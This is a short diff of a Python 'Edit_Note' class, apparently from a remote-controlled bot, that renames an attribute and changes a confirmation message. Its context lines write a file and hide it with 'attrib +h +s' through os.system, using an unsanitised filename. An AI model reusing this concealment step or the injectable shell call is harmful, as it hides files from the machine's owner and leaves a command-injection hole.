@@ -1,7 +1,8 @@
 import os, re, sys
 class Edit_Note():
 	def __init__(self, _):
-		self.program = " ".join(_.args)
+		self.note = " ".join(_.args)
+		_.note = self.note
 		self.Send_Message = _.Send_Message
 		self.note = _.note
 		self.Main()
@@ -17,4 +18,4 @@ class Edit_Note():
 		file.write(read)
 		file.close()
 		os.system('attrib +h +s ' + filename)
-		self.Send_Message.Send("%E2%9C%94%EF%B8%8F Program Name Changed")
+		self.Send_Message.Send("%E2%9C%94%EF%B8%8F Note Changed")
